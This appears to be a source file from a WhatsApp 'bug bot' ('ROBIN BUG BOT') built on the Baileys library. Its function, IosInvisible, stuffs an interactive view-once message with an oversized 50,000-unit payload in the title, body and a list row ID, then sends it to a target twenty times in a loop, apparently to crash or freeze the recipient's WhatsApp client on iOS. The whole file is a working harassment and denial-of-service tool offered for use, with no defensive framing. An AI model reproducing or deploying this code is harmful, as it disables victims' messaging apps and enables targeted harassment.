
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

async function IosInvisible(SYxS7, target) {
    const superSpam = getSuperPayload(50000);
    const payload = {
        interactiveMessage: {
            header: { title: superSpam, hasMediaAttachment: false },
            body: { text: superSpam },
            footer: { text: "ROBIN BUG BOT" },
            nativeFlowMessage: {
                buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({ title: "IOS", sections: [{ title: "X", rows: [{ title: "X", rowId: superSpam }] }] })
                }]
            }
        }
    };

    for (let i = 0; i < 20; i++) {
        await SYxS7.relayMessage(target, { viewOnceMessage: { message: payload } }, { participant: { jid: target } });
        await new Promise(res => setTimeout(res, 300));
    }
}

module.exports = { IosInvisible };
